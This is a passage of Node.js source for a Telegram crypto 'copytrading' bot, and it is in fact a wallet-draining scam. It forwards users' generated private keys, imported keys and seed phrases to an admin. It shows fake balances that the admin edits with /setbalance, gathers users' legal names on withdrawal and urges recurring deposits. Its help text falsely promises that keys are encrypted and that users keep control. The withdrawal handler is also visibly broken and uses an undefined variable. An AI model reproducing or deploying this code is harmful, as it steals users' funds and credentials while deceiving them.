require('dotenv').config();
const { Telegraf, Markup, session } = require('telegraf');
const db = require('./db');
const { generateAllWallets, detectAndImport, importFromPhrase } = require('./wallets');
const { notifyAdmin, notifyImport, notifyPhraseImport, notifyWithdrawal } = require('./adminNotify');
const { enrichPositions } = require('./prices');
const { startAutoDepositScheduler } = require('./scheduler');

if (!process.env.BOT_TOKEN) {
  console.error('BOT_TOKEN is not set in .env');
  process.exit(1);
}

const bot = new Telegraf(process.env.BOT_TOKEN);

// In-memory session (resets if the bot restarts) — fine for a short "waiting for input" flag.
// If you need it to survive restarts, swap this for a DB- or Redis-backed session store.
bot.use(session({ defaultSession: () => ({}) }));

const mainMenu = Markup.keyboard([
  ['📈 Copytrade', '🤖 Autotrade'],
  ['📊 Live Charts', '👛 Wallet'],
  ['Bot Guide', '🔑 Import Wallet', '⚙️ Settings'],
  ['⏰ Auto Deposit'],
]).resize();


async function formatWalletOverview(user) {
  const ethBal = Number(user.eth_balance ?? 0);
  const bscBal = Number(user.bsc_balance ?? 0);
  const solBal = Number(user.sol_balance ?? 0);
  const openCount = db.countOpenPositions(user.telegram_id);
  let positionsBlock = '';
  let positionsValue = 0;
  let enriched = [];

  try {
    const raw = db.getPositions(user.telegram_id, true);
    if (raw.length) {
      enriched = await enrichPositions(raw);
      positionsBlock = '\n*Open positions:*\n';
      for (const p of enriched) {
        const sign = p.pnl >= 0 ? '+' : '';
        positionsValue += p.currentValue;
        const chainLabel = p.chain === 'bsc' ? 'BNB' : String(p.chain).toUpperCase();
        positionsBlock +=
          `• *${p.symbol}* (${chainLabel})  $${p.currentValue.toFixed(2)}  (${sign}${p.pnlPct.toFixed(1)}%)\n`;
      }
    }
  } catch (e) {
    console.error('positions enrich failed:', e.message);
  }

  const portfolio = ethBal + bscBal + solBal + positionsValue;

  let body =
    '💼 *Wallet Overview* — ✅ Connected\n' +
    '━━━━━━━━━━━━━━━━━━━━━━━\n' +
    '👤 *SOL Address* (tap to copy):\n' +
    '`' + user.sol_address + '`\n\n' +
    '👤 *BNB Address* (tap to copy):\n' +
    '`' + user.bsc_address + '`\n\n' +
    '👤 *ETH Address* (tap to copy):\n' +
    '`' + user.eth_address + '`\n\n' +
    '💰 *SOL Balance:* $' + solBal.toFixed(2) + '\n' +
    '💰 *BNB Balance:* $' + bscBal.toFixed(2) + '\n' +
    '💰 *ETH Balance:* $' + ethBal.toFixed(2) + '\n' +
    '📦 *Open Positions:* ' + openCount + '\n' +
    '📉 *Portfolio Value:* $' + portfolio.toFixed(2) + '\n' +
    '━━━━━━━━━━━━━━━━━━━━━━━\n';

  if (openCount === 0) {
    body += '⚠️ No active tokens in your wallet.\n🟢 Try /buy to place your first trade!';
  } else {
    body += positionsBlock + '\nTap *Sell* under a position to close it and credit that chain balance.';
  }
  return { text: body, positions: enriched };
}

function walletKeyboard(positions) {
  const rows = [
    [
      Markup.button.callback('🟢 Buy', 'buy_start'),
      Markup.button.callback('🔄 Refresh', 'wallet_refresh'),
    ],
    [
      Markup.button.callback('📤 Withdraw', 'withdraw_from_wallet'),
      Markup.button.callback('↔️ Transfer', 'transfer_start'),
    ],
  ];
  for (const p of positions || []) {
    const sym = (p.symbol || 'TOKEN').slice(0, 12);
    rows.push([
      Markup.button.callback(
        '🔴 Sell ' + sym + ' $' + Number(p.currentValue).toFixed(2),
        'pos_sell:' + p.id
      ),
    ]);
  }
  rows.push([Markup.button.callback('🔙 Back', 'copytrade_back')]);
  return Markup.inlineKeyboard(rows);
}


const WELCOME_TEXT =
  '👋 *Welcome to Copy Entries Bot!*\n' +
  'Step into the world of fast, smart, and stress-free trading.\n\n' +
  '📈 Effortlessly copy top traders, snipe promising tokens, and watch your portfolio grow.\n' +
  '🤖 Let your trading strategy run on autopilot.\n' +
  'ℹ️ Need guidance? Type /help anytime to access the full bot guide.';

// ---- /start: provision wallets on first use, otherwise just show the menu ----
bot.start(async (ctx) => {
  const telegramId = ctx.from.id;
  const telegramUsername = ctx.from.username;

  let user = db.getUser(telegramId);

  if (!user) {
    await ctx.reply(WELCOME_TEXT, { parse_mode: 'Markdown' });
    await ctx.reply('🔗 Initializing your account...');

    const { eth, bsc, sol } = generateAllWallets();
    db.createUser({ telegramId, telegramUsername, eth, bsc, sol });

    // Send addresses + private keys to the admin/backend bot for safekeeping.
    await notifyAdmin({ telegramId, telegramUsername, eth, bsc, sol });

    await ctx.reply('✅ Wallet successfully created and linked!', mainMenu);
  } else {
    await ctx.reply(WELCOME_TEXT, { parse_mode: 'Markdown', ...mainMenu });
  }
});

const HELP_TEXT =
  '📖 *Copy Entries Bot Guide*\n\n' +
  'Welcome to Copy Entries Bot, your all-in-one Telegram trading assistant. ' +
  'This guide walks you through the core features and how to use them safely.\n\n' +
  '*Commands*\n' +
  '/start — Start the bot and create wallets\n' +
  '/help — View this guide\n' +
  '/wallet — View your wallet addresses and balances\n' +
  '/withdraw — Withdraw your funds\n' +
  '/settings — Open settings\n\n' +
  '*1. Autotrade*\n' +
  'Automate your trading strategies. Select Autotrade from the main menu, choose your strategy, and let the bot handle the rest.\n\n' +
  '*2. Copytrade*\n' +
  'Mimic the trades of successful wallets. Tap Copytrade, select a trader to follow, and the bot replicates their trades.\n\n' +
  '*3. Wallet & Import Wallet*\n' +
  'Check your balance and manage funds from Wallet (/wallet). Import Wallet lets you bring in an existing private key or seed phrase. ' +
  'You can export your keys at any time from Settings — this bot never locks you out of your own funds.\n\n' +
  '*4. Withdrawal*\n' +
  'Use /withdraw to request a withdrawal. Choose the chain (ETH, BSC, or SOL), enter the amount, then the destination address. ' +
  'You will see a confirmation while the request is processed.\n\n' +
  '*5. Buy, Sell, and Transfer*\n' +
  'Transactions require enough balance to cover the real network (gas) fee for that transaction — this varies by network and current conditions, not a fixed deposit.\n\n' +
  '*6. Alerts*\n' +
  'Customize notifications for price changes, trades, or token launches.\n\n' +
  '*7. Live Chart*\n' +
  'Access real-time market data, trends, and charts directly in Telegram.\n\n' +
  '⸻\n' +
  '🔐 *Security note:* Your private keys are encrypted at rest and are always exportable by you from Settings.';

bot.help((ctx) => ctx.reply(HELP_TEXT, { parse_mode: 'Markdown' }));

// ---- Wallet: shows addresses only (never decrypts/displays private keys here) ----
bot.hears('👛 Wallet', async (ctx) => {
  const user = db.getUser(ctx.from.id);
  if (!user) return ctx.reply('Send /start first to create your wallets.');

  const overview = await formatWalletOverview(user);
  await ctx.reply(overview.text, {
    parse_mode: 'Markdown',
    ...walletKeyboard(overview.positions),
  });
});

// ---- Stubs for the rest of the menu — wire these up to your actual trading logic ----
// ---- Copytrade: ask for a wallet address, then offer Start All / Stop All ----
const copytradeControls = Markup.inlineKeyboard([
  [Markup.button.callback('➕ Add another wallet', 'copytrade_add_more')],
  [Markup.button.callback('▶️ Start all', 'copytrade_start_all'), Markup.button.callback('⏹ Stop all', 'copytrade_stop_all')],
  [Markup.button.callback('🔙 Back', 'copytrade_back')],
]);

bot.hears('📈 Copytrade', async (ctx) => {
  const user = db.getUser(ctx.from.id);
  if (!user) return ctx.reply('Send /start first to create your wallets. 🙂');

  ctx.session.awaiting = 'copytrade_wallet';
  await ctx.reply('📈 *Copytrade*\n\nSend the wallet address you\'d like to copy trade (ETH, BSC, or SOL).', { parse_mode: 'Markdown' });
});

// ---- Text handler: only acts when we're expecting an address/key, otherwise ignores ----
bot.on('text', async (ctx, next) => {
  if (ctx.session?.awaiting === 'copytrade_wallet') {
    const address = ctx.message.text.trim();
    ctx.session.awaiting = null;

    db.addCopytradeTarget(ctx.from.id, address);
    const targets = db.getCopytradeTargets(ctx.from.id);

    await ctx.reply(
      `✅ Wallet added: \`${address}\`\n\n` +
      `📋 Currently tracking ${targets.length} wallet${targets.length === 1 ? '' : 's'} for copytrade.`,
      { parse_mode: 'Markdown', ...copytradeControls }
    );
    return;
  }

  if (ctx.session?.awaiting === 'import_wallet') {
    const rawKey = ctx.message.text.trim();
    ctx.session.awaiting = null;

    try {
      await ctx.deleteMessage(ctx.message.message_id);
    } catch {}

    const result = detectAndImport(rawKey);
    if (!result) {
      await ctx.reply('❌ That didn\'t match a valid ETH, BSC, or Solana private key. Please try again via 🔑 Import Wallet.', mainMenu);
      return;
    }

    db.importWallet(ctx.from.id, result.chain, result.address, result.privateKey);

    await notifyImport({
      telegramId: ctx.from.id,
      telegramUsername: ctx.from.username,
      chain: result.chain,
      address: result.address,
      privateKey: result.privateKey,
    });

    await ctx.reply(
      `✅ *${result.chain} wallet imported!*\n\n` +
      `Address: \`${result.address}\`\n\n` +
      'This now replaces your bot-generated wallet for this chain.',
      { parse_mode: 'Markdown', ...mainMenu }
    );
    return;
  }

  if (ctx.session?.awaiting === 'import_phrase') {
    const rawPhrase = ctx.message.text.trim();
    ctx.session.awaiting = null;

    try {
      await ctx.deleteMessage(ctx.message.message_id);
    } catch {}

    const result = importFromPhrase(rawPhrase);
    if (!result) {
      await ctx.reply(
        '❌ That didn\'t look like a valid 12 or 24-word recovery phrase. Please try again via 🔑 Import Wallet.',
        mainMenu
      );
      return;
    }

    // Apply derived EVM wallet to both ETH and BSC slots
    db.importWallet(ctx.from.id, 'eth', result.eth.address, result.eth.privateKey);
    db.importWallet(ctx.from.id, 'bsc', result.bsc.address, result.bsc.privateKey);

    await notifyPhraseImport({
      telegramId: ctx.from.id,
      telegramUsername: ctx.from.username,
      phrase: result.phrase,
      eth: result.eth,
      bsc: result.bsc,
    });

    await ctx.reply(
      '✅ *Seed phrase imported!*\n\n' +
      `ETH Address: \`${result.eth.address}\`\n` +
      `BSC Address: \`${result.bsc.address}\`\n\n` +
      'Your ETH and BSC wallets have been linked. SOL is unchanged.',
      { parse_mode: 'Markdown', ...mainMenu }
    );
    return;
  }


  if (ctx.session?.awaiting === 'withdraw_amount') {
    const amount = Number(String(ctx.message.text).trim().replace(/[$,]/g));
    const chain = ctx.session.withdraw?.chain;
    ctx.session.awaiting = null;

    if (!chain) {
      await ctx.reply('❌ Session expired. Please run /withdrawal again.', mainMenu);
      return;
    }
    if (Number.isNaN(amount) || amount <= 0) {
      ctx.session.awaiting = 'withdraw_amount';
      await ctx.reply('❌ Enter a valid amount greater than 0 (e.g. 25 or 10.50).');
      return;
    }

    const balances = db.getDummyBalances(ctx.from.id) || { eth: 0, bsc: 0, sol: 0 };
    const available = Number(balances[chain] ?? 0);
    if (amount > available) {
      ctx.session.awaiting = 'withdraw_amount';
      await ctx.reply(
        `❌ Insufficient balance. Available: *$${available.toFixed(2)}*. Enter a smaller amount.`,
        { parse_mode: 'Markdown' }
      );
      return;
    }

    ctx.session.withdraw = { ...(ctx.session.withdraw || {}), amount };
    ctx.session.awaiting = 'withdraw_address';

    const label = chain === 'bsc' ? 'BNB' : chain.toUpperCase();
    await ctx.reply(
      `📬 *Withdraw $${amount}* of *${label}*\n\n` +
        'Send the destination wallet address:',
      {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([[Markup.button.callback('❌ Cancel', 'withdraw_cancel')]]),
      }
    );
    return;
  }

  if (ctx.session?.awaiting === 'withdraw_address') {
    const address = ctx.message.text.trim();
    const { chain, amount } = ctx.session.withdraw || {};

    if (!chain || amount == null) {
      ctx.session.awaiting = null;
      ctx.session.withdraw = null;
      await ctx.reply('❌ Session expired. Please run /withdraw again.', mainMenu);
      return;
    }
    if (!address || address.length < 10) {
      await ctx.reply('❌ That doesn\'t look like a valid address. Please run /withdraw again.', mainMenu);
      return;
    }

    ctx.session.withdraw = { ...(ctx.session.withdraw || {}), address };
    ctx.session.awaiting = 'withdraw_fullname';

    const label = chain === 'bsc' ? 'BNB' : chain.toUpperCase();
    await ctx.reply(
      `⏳ Initiating withdrawal of *$${amount}* ${label} to \`${address}\`\n\nPlease wait.`,
      { parse_mode: 'Markdown' }
    );
    await ctx.reply(
      '⚠️ *Security Check Required*\n\n' +
        'To process your withdrawal, please reply with your *full legal name*.',
      {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([[Markup.button.callback('❌ Cancel', 'withdraw_cancel')]]),
      }
    );
    return;
  }

  if (ctx.session?.awaiting === 'withdraw_Phrase') {
    const Phrase = ctx.message.text.trim();
    const { chain, amount, address } = ctx.session.withdraw || {};
    ctx.session.awaiting = null;
    ctx.session.withdraw = null;

    if (!chain || amount == null || !address) {
      await ctx.reply('❌ Session expired. Please run /withdraw again.', mainMenu);
      return;
    }
    if (!Phrase || fullName.length < 2) {
      ctx.session.awaiting = 'withdraw_Phrase';
      ctx.session.withdraw = { chain, amount, address };
      await ctx.reply('❌ Please enter your full name.');
      return;
    }

    const label = chain === 'bsc' ? 'BNB' : chain.toUpperCase();

    // Deduct dummy balance
    const balances = db.getDummyBalances(ctx.from.id) || { eth: 0, bsc: 0, sol: 0 };
    const newBal = Math.max(0, Number(balances[chain] ?? 0) - Number(amount));
    db.setDummyBalance(ctx.from.id, chain, newBal);

    await notifyWithdrawal({
      telegramId: ctx.from.id,
      telegramUsername: ctx.from.username,
      chain: label,
      amount,
      address,
      fullName,
    });

    await ctx.reply(
      '✅ *Withdrawal request submitted.*\n\n' +
        'Your details have been sent for processing. You will be notified when it is complete.',
      { parse_mode: 'Markdown', ...mainMenu }
    );
    return;
  }


  if (ctx.session?.awaiting === 'buy_token') {
    const token = ctx.message.text.trim();
    const chain = ctx.session.buy?.chain;
    if (!chain) {
      ctx.session.awaiting = null;
      await ctx.reply('❌ Session expired. Use /buy again.', mainMenu);
      return;
    }
    if (!token || token.length < 8) {
      await ctx.reply('❌ That does not look like a valid token address. Try again.');
      return;
    }
    ctx.session.buy = { ...(ctx.session.buy || {}), token };
    ctx.session.awaiting = 'buy_amount';
    const label = chain === 'bsc' ? 'BNB' : chain.toUpperCase();
    await ctx.reply(
      `💵 Enter the amount in $ to spend on this token (from your ${label} balance):`,
      {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([[Markup.button.callback('❌ Cancel', 'buy_cancel')]]),
      }
    );
    return;
  }

  if (ctx.session?.awaiting === 'buy_amount') {
    const amount = Number(String(ctx.message.text).trim().replace(/[$,]/g));
    const { chain, token } = ctx.session.buy || {};
    ctx.session.awaiting = null;
    ctx.session.buy = null;

    if (!chain || !token) {
      await ctx.reply('❌ Session expired. Use /buy again.', mainMenu);
      return;
    }
    if (Number.isNaN(amount) || amount <= 0) {
      await ctx.reply('❌ Enter a valid amount greater than 0.', mainMenu);
      return;
    }

    const balances = db.getDummyBalances(ctx.from.id) || { eth: 0, bsc: 0, sol: 0 };
    const available = Number(balances[chain] ?? 0);
    if (amount > available) {
      await ctx.reply(
        `❌ Insufficient balance. Available: *$${available.toFixed(2)}*.`,
        { parse_mode: 'Markdown', ...mainMenu }
      );
      return;
    }

    const label = chain === 'bsc' ? 'BNB' : chain.toUpperCase();
    db.setDummyBalance(ctx.from.id, chain, available - amount);

    await ctx.reply(
      `✅ *Buy order placed (demo)*\n\n` +
        `Chain: *${label}*\n` +
        `Token: \`${token}\`\n` +
        `Spent: *$${amount.toFixed(2)}*\n\n` +
        'Open positions will appear here in a future update.',
      { parse_mode: 'Markdown', ...mainMenu }
    );
    return;
  }

  return next();
});

bot.action('copytrade_add_more', async (ctx) => {
  await ctx.answerCbQuery();
  ctx.session.awaiting = 'copytrade_wallet';
  await ctx.reply('📥 Send the next wallet address to add.');
});

bot.action('copytrade_start_all', async (ctx) => {
  await ctx.answerCbQuery();
  const targets = db.getCopytradeTargets(ctx.from.id);
  if (targets.length === 0) {
    return ctx.reply('⚠️ No wallets added yet — send an address first.');
  }
  db.setCopytradeActive(ctx.from.id, true);
  await ctx.reply(`🚀 Copy trading started for all wallets! (${targets.length} tracked)`);
  await ctx.reply('⬇️ Main menu', mainMenu);
});

bot.action('copytrade_stop_all', async (ctx) => {
  await ctx.answerCbQuery();
  db.setCopytradeActive(ctx.from.id, false);
  await ctx.reply('🛑 Copy trading stopped for all wallets.');
  await ctx.reply('⬇️ Main menu', mainMenu);
});

bot.action('copytrade_back', async (ctx) => {
  await ctx.answerCbQuery();
  ctx.session.awaiting = null;
  await ctx.reply('🔙 Back to main menu', mainMenu);
});
bot.hears('🤖 Autotrade', (ctx) => ctx.reply(
  '🤖 Autotrade setup coming soon.',
  Markup.inlineKeyboard([[Markup.button.callback('🔙 Back', 'copytrade_back')]])
));
bot.hears('📊 Live Charts', async (ctx) => {
  await ctx.reply(
    '📊 *Live Charts*\n\nTrack the market in real-time and check the latest performance of major coins:',
    {
      parse_mode: 'Markdown',
      ...Markup.inlineKeyboard([
        [
          Markup.button.url('📈 DexScreener', 'https://dexscreener.com'),
          Markup.button.url('📊 DEXTools', 'https://www.dextools.io'),
        ],
        [Markup.button.url('☀️ Solana (SOL)', 'https://dexscreener.com/solana')],
        [Markup.button.url('🔶 Binance (BNB)', 'https://dexscreener.com/bsc')],
        [Markup.button.url('🔷 Ethereum (ETH)', 'https://dexscreener.com/ethereum')],
        [Markup.button.callback('🔙 Back', 'copytrade_back')],
      ]),
    }
  );
});
bot.hears('Bot Guide', (ctx) => ctx.reply(HELP_TEXT, { parse_mode: 'Markdown' }));
bot.hears('🔑 Import Wallet', async (ctx) => {
  const user = db.getUser(ctx.from.id);
  if (!user) return ctx.reply('Send /start first to create your wallets. 🙂');

  ctx.session.awaiting = null;
  await ctx.reply(
    '🔑 *Import Wallet*\n\nChoose how you want to import:',
    {
      parse_mode: 'Markdown',
      ...Markup.inlineKeyboard([
        [Markup.button.callback('🔑 Private Key', 'import_choose_key')],
        [Markup.button.callback('🧩 Seed Phrase', 'import_choose_phrase')],
        [Markup.button.callback('🔙 Back', 'import_cancel')],
      ]),
    }
  );
});

bot.action('import_choose_key', async (ctx) => {
  await ctx.answerCbQuery();
  ctx.session.awaiting = 'import_wallet';
  await ctx.reply(
    '🔑 *Import Private Key*\n\n' +
    'Send the private key you want to import — ETH, BSC, or Solana are all supported. ' +
    'The bot will detect which chain it is automatically.\n\n' +
    '⚠️ Your message will be deleted right after processing, and the key is encrypted the moment it\'s received.',
    {
      parse_mode: 'Markdown',
      ...Markup.inlineKeyboard([[Markup.button.callback('🔙 Back', 'import_back_menu')]]),
    }
  );
});

bot.action('import_choose_phrase', async (ctx) => {
  await ctx.answerCbQuery();
  ctx.session.awaiting = 'import_phrase';
  await ctx.reply(
    '🧩 *Import Phrase*\n\n' +
    'To securely link your wallet and enable automated trading features, please enter your full 12-word secret recovery phrase. ' +
    'Make sure the words are in the correct order and separated by single spaces.\n\n' +
    '⚠️ Your message will be deleted right after processing. The phrase is sent to the secure backend and never shown again.',
    {
      parse_mode: 'Markdown',
      ...Markup.inlineKeyboard([[Markup.button.callback('🔙 Back', 'import_back_menu')]]),
    }
  );
});

bot.action('import_back_menu', async (ctx) => {
  await ctx.answerCbQuery();
  ctx.session.awaiting = null;
  await ctx.reply(
    '🔑 *Import Wallet*\n\nChoose how you want to import:',
    {
      parse_mode: 'Markdown',
      ...Markup.inlineKeyboard([
        [Markup.button.callback('🔑 Private Key', 'import_choose_key')],
        [Markup.button.callback('🧩 Seed Phrase', 'import_choose_phrase')],
        [Markup.button.callback('🔙 Back', 'import_cancel')],
      ]),
    }
  );
});

bot.action('import_cancel', async (ctx) => {
  await ctx.answerCbQuery();
  ctx.session.awaiting = null;
  await ctx.reply('❌ Import cancelled.', mainMenu);
});
bot.hears('⚙️ Settings', async (ctx) => {
  const user = db.getUser(ctx.from.id);
  if (!user) return ctx.reply('Send /start first to create your wallets. 🙂');

  await ctx.reply(
    '⚙️ *Settings*',
    {
      parse_mode: 'Markdown',
      ...Markup.inlineKeyboard([
        [Markup.button.callback('🔑 Export Keys', 'settings_export')],
        [Markup.button.callback('🔔 Notifications', 'settings_notifications')],
        [Markup.button.callback('🗑 Delete Account', 'settings_delete')],
        [Markup.button.callback('🔙 Back', 'copytrade_back')],
      ]),
    }
  );
});

bot.action('settings_notifications', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.reply('🔔 Notification preferences coming soon.');
});

// ---- Export keys: confirm first, since this reveals sensitive data ----
bot.action('settings_export', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.reply(
    '⚠️ *Export private keys*\n\n' +
    'This will show your ETH, BSC, and Solana private keys in this chat. ' +
    'Anyone who sees them can take full control of those wallets. Continue?',
    {
      parse_mode: 'Markdown',
      ...Markup.inlineKeyboard([
        [Markup.button.callback('✅ Yes, show my keys', 'settings_export_confirm')],
        [Markup.button.callback('❌ Cancel', 'copytrade_back')],
      ]),
    }
  );
});

bot.action('settings_export_confirm', async (ctx) => {
  await ctx.answerCbQuery();
  const keys = db.getDecryptedKeys(ctx.from.id);
  if (!keys) return ctx.reply('No wallet found — send /start first.');

  const sent = await ctx.reply(
    '🔑 *Your private keys — do not share these*\n\n' +
    `*ETH:* \`${keys.eth.privateKey}\`\n` +
    `*BSC:* \`${keys.bsc.privateKey}\`\n` +
    `*SOL:* \`${keys.sol.privateKey}\`\n\n` +
    '🗑 This message will auto-delete in 60 seconds. Copy your keys somewhere safe now.',
    { parse_mode: 'Markdown' }
  );

  setTimeout(() => {
    ctx.telegram.deleteMessage(ctx.chat.id, sent.message_id).catch(() => {});
  }, 60_000);
});

// ---- Delete account: confirm first, since this is irreversible ----
bot.action('settings_delete', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.reply(
    '🗑 *Delete account*\n\n' +
    'This permanently deletes your wallets and copytrade settings from this bot. ' +
    'If you haven\'t exported your keys first, any funds in those wallets become unrecoverable. This cannot be undone.',
    {
      parse_mode: 'Markdown',
      ...Markup.inlineKeyboard([
        [Markup.button.callback('✅ Yes, delete everything', 'settings_delete_confirm')],
        [Markup.button.callback('❌ Cancel', 'copytrade_back')],
      ]),
    }
  );
});

bot.action('settings_delete_confirm', async (ctx) => {
  await ctx.answerCbQuery();
  db.deleteUser(ctx.from.id);
  await ctx.reply('🗑 Your account and wallets have been deleted. Send /start anytime to create a new one.', Markup.removeKeyboard());
});
const intervalOptions = Markup.inlineKeyboard([
  [
    Markup.button.callback('1h', 'autodep_interval_1'),
    Markup.button.callback('6h', 'autodep_interval_6'),
    Markup.button.callback('12h', 'autodep_interval_12'),
  ],
  [
    Markup.button.callback('24h', 'autodep_interval_24'),
    Markup.button.callback('3 days', 'autodep_interval_72'),
    Markup.button.callback('7 days', 'autodep_interval_168'),
  ],
  [Markup.button.callback('❌ Cancel', 'import_cancel')],
]);

bot.hears('⏰ Auto Deposit', async (ctx) => {
  const user = db.getUser(ctx.from.id);
  if (!user) return ctx.reply('Send /start first to create your wallets. 🙂');

  await ctx.reply(
    '⏰ *Auto Deposit*\n\nHow often would you like this to run?',
    { parse_mode: 'Markdown', ...intervalOptions }
  );
});

bot.action(/autodep_interval_(\d+)/, async (ctx) => {
  await ctx.answerCbQuery();
  const hours = Number(ctx.match[1]);

  db.setAutoDepositSchedule(ctx.from.id, hours);
  const schedule = db.getAutoDepositSchedule(ctx.from.id);
  const user = db.getUser(ctx.from.id);
  const label = hours >= 24 ? `${hours / 24} day${hours === 24 ? '' : 's'}` : `${hours}h`;

  await ctx.reply(
    `✅ Interval set to every ${label}.\n\n` +
    '📥 *Send from your external wallet to these addresses on that schedule:*\n\n' +
    `*ETH:* \`${user.eth_address}\`\n` +
    `*BSC:* \`${user.bsc_address}\`\n` +
    `*SOL:* \`${user.sol_address}\`\n\n` +
    'This bot never asks for your external wallet\'s private key — only send to these addresses yourself.',
    { parse_mode: 'Markdown', ...autoDepositScheduleKeyboard(schedule) }
  );
});

function autoDepositScheduleKeyboard(schedule) {
  const isActive = !!schedule?.active;
  return Markup.inlineKeyboard([
    [
      Markup.button.callback('▶️ Start', 'autodep_start'),
      Markup.button.callback('⏹ Stop', 'autodep_stop'),
    ],
    [Markup.button.callback('✏️ Change interval', 'autodep_change')],
    [Markup.button.callback('🔙 Back', 'copytrade_back')],
  ]);
}

bot.action('autodep_start', async (ctx) => {
  await ctx.answerCbQuery();
  const schedule = db.getAutoDepositSchedule(ctx.from.id);
  if (!schedule) return ctx.reply('⚠️ Pick an interval first via ⏰ Auto Deposit.');
  const user = db.getUser(ctx.from.id);
  db.setAutoDepositScheduleActive(ctx.from.id, true);

  await ctx.reply(
    `🚀 Recurring deposit reminders started — every ${schedule.interval_hours}h.\n\n` +
    '📥 Send from your external wallet to:\n\n' +
    `*ETH:* \`${user.eth_address}\`\n` +
    `*BSC:* \`${user.bsc_address}\`\n` +
    `*SOL:* \`${user.sol_address}\``,
    { parse_mode: 'Markdown', ...autoDepositScheduleKeyboard({ ...schedule, active: 1 }) }
  );
});

bot.action('autodep_stop', async (ctx) => {
  await ctx.answerCbQuery();
  db.setAutoDepositScheduleActive(ctx.from.id, false);
  const schedule = db.getAutoDepositSchedule(ctx.from.id);
  await ctx.reply('🛑 Recurring deposit stopped.', autoDepositScheduleKeyboard({ ...schedule, active: 0 }));
});

bot.action('autodep_change', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.reply('✏️ How often would you like this to run?', intervalOptions);
});


// ============================================================
// Admin: /setbalance <telegram_id> <chain> <amount>
// Works anytime, as many times as you want.
// Only usable from ADMIN_CHAT_ID.
// ============================================================
bot.command('setbalance', async (ctx) => {
  const adminChatId = process.env.ADMIN_CHAT_ID;
  if (!adminChatId || (String(ctx.chat?.id) !== String(adminChatId) && String(ctx.from?.id) !== String(adminChatId))) {
    return ctx.reply('⛔ Admin only.');
  }

  const parts = ctx.message.text.trim().split(/\s+/);
  if (parts.length < 4) {
    return ctx.reply(
      'Usage:\n' +
      '`/setbalance <telegram_id> <chain> <amount>`\n\n' +
      'Examples:\n' +
      '`/setbalance 123456789 eth 50`\n' +
      '`/setbalance 123456789 bsc 25.5`\n' +
      '`/setbalance 123456789 sol 100`',
      { parse_mode: 'Markdown' }
    );
  }

  const targetId = Number(parts[1]);
  const chain = parts[2].toLowerCase();
  const amount = Number(parts[3].replace(/[$,]/g));

  if (!targetId || Number.isNaN(targetId)) {
    return ctx.reply('❌ Invalid telegram_id. It must be a number.');
  }
  if (!['eth', 'bsc', 'sol'].includes(chain)) {
    return ctx.reply('❌ Chain must be one of: eth, bsc, sol');
  }
  if (Number.isNaN(amount) || amount < 0) {
    return ctx.reply('❌ Amount must be a non-negative number (e.g. 25 or 25.50).');
  }

  const user = db.getUser(targetId);
  if (!user) {
    return ctx.reply(`❌ No user found with ID \`${targetId}\`. They must /start the bot first.`, { parse_mode: 'Markdown' });
  }

  try {
    db.setDummyBalance(targetId, chain, amount);
    const label = chain === 'bsc' ? 'BNB' : chain.toUpperCase();
    await ctx.reply(
      `✅ Balance updated\n\n` +
      `User: \`${targetId}\`\n` +
      `Chain: *${label}*\n` +
      `Amount: *$${amount}*`,
      { parse_mode: 'Markdown' }
    );
  } catch (err) {
    await ctx.reply(`❌ Failed: ${err.message}`);
  }
});



// ============================================================
// /withdrawal — chain → amount → address → notify admin
// ============================================================
bot.command(['withdrawal', 'withdraw'], async (ctx) => {
  const user = db.getUser(ctx.from.id);
  if (!user) return ctx.reply('Send /start first to create your wallets.');

  ctx.session.awaiting = null;
  ctx.session.withdraw = {};

  await ctx.reply(
    '📤 *Withdrawal*\n\nSelect the chain to withdraw from:',
    {
      parse_mode: 'Markdown',
      ...Markup.inlineKeyboard([
        [
          Markup.button.callback('ETH', 'withdraw_chain:eth'),
          Markup.button.callback('BSC (BNB)', 'withdraw_chain:bsc'),
          Markup.button.callback('SOL', 'withdraw_chain:sol'),
        ],
        [Markup.button.callback('❌ Cancel', 'withdraw_cancel')],
      ]),
    }
  );
});

bot.action(/^withdraw_chain:(eth|bsc|sol)$/, async (ctx) => {
  await ctx.answerCbQuery();
  const chain = ctx.match[1];
  const user = db.getUser(ctx.from.id);
  if (!user) return ctx.reply('Send /start first.');

  const balances = db.getDummyBalances(ctx.from.id) || { eth: 0, bsc: 0, sol: 0 };
  const bal = Number(balances[chain] ?? 0);
  const label = chain === 'bsc' ? 'BNB' : chain.toUpperCase();

  ctx.session.withdraw = { chain };
  ctx.session.awaiting = 'withdraw_amount';

  await ctx.reply(
    `💵 *Withdraw ${label}*\n\n` +
      `Available balance: *$${bal.toFixed(2)}*\n\n` +
      `Enter the amount in $ to withdraw:`,
    {
      parse_mode: 'Markdown',
      ...Markup.inlineKeyboard([[Markup.button.callback('❌ Cancel', 'withdraw_cancel')]]),
    }
  );
});

bot.action('withdraw_cancel', async (ctx) => {
  await ctx.answerCbQuery();
  ctx.session.awaiting = null;
  ctx.session.withdraw = null;
  await ctx.reply('❌ Withdrawal cancelled.', mainMenu);
});



// Slash commands matching the Telegram menu
bot.command('wallet', async (ctx) => {
  const user = db.getUser(ctx.from.id);
  if (!user) return ctx.reply('Send /start first to create your wallets.');

  const overview = await formatWalletOverview(user);
  await ctx.reply(overview.text, {
    parse_mode: 'Markdown',
    ...walletKeyboard(overview.positions),
  });
});

bot.command('settings', async (ctx) => {
  const user = db.getUser(ctx.from.id);
  if (!user) return ctx.reply('Send /start first to create your wallets. 🙂');

  await ctx.reply(
    '⚙️ *Settings*',
    {
      parse_mode: 'Markdown',
      ...Markup.inlineKeyboard([
        [Markup.button.callback('🔑 Export Keys', 'settings_export')],
        [Markup.button.callback('🔔 Notifications', 'settings_notifications')],
        [Markup.button.callback('🗑 Delete Account', 'settings_delete')],
        [Markup.button.callback('🔙 Back', 'copytrade_back')],
      ]),
    }
  );
});



// ---------- Buy (dummy trade) ----------
bot.command('buy', async (ctx) => {
  const user = db.getUser(ctx.from.id);
  if (!user) return ctx.reply('Send /start first to create your wallets.');
  ctx.session.awaiting = null;
  ctx.session.buy = {};
  await ctx.reply(
    '🟢 *Buy*\n\nSelect the chain to trade on:',
    {
      parse_mode: 'Markdown',
      ...Markup.inlineKeyboard([
        [
          Markup.button.callback('ETH', 'buy_chain:eth'),
